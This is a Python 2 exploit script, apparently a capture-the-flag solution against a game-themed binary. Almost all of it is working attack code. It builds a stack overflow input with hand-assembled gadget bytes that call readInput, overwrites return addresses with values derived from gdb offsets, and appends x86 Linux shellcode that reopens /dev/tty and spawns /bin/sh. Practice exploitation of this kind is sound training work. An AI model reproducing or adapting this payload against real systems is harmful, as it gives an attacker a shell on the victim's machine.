import struct
import sys

# this 55 bytes on keeps inputs open and other magic stuff
shellcode = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"

# the offset is the same on all systems
addr_offset = 0x18

# the second addr is the position of the second enemy gleaned from wizard sight
# for my system in gdb
second_addr = 0xffffd474
second_addr = int(sys.argv[1], 16)
print '{0:02x}'.format(second_addr)

# this is for gdb on my system
init_addr = 0xffffd46a
init_addr = second_addr - int(sys.argv[2], 16)# this offset changes- 0xa
print '{0:02x}'.format(init_addr)

# select all unicorns for overflow
output = ""
for i in range(0, 11):
    output += "u\n"

# build gadgets to call readInput(3rd stack addr, enough bytes for shellcode)
# again for my system
#end_addr = 0xffffd564
end_addr = init_addr + int(sys.argv[3], 16)# this offset changes+ 0xFA
print '{0:02x}'.format(end_addr)
# mov eax, end_addr
# ret
output += "\xB8" + struct.pack("I", end_addr) + "\xC3\n"
# push eax
# push eax
# push 0x8048e3c <readInput>
output += "\x50\x50\x68\x3C\x8E\x04\x08\xC3\n"
    
# fill names with B's
for i in range(3, 11):
    output += "B" * 10 + "\n"

# overwrite 2 ret addrs with gadget addrs
output += "AA" + struct.pack("I", init_addr) + struct.pack("I", init_addr + addr_offset) + "\n"

# commit suicide
output += "a\n"*18

# append shellcode
output += shellcode + "\n"
print output
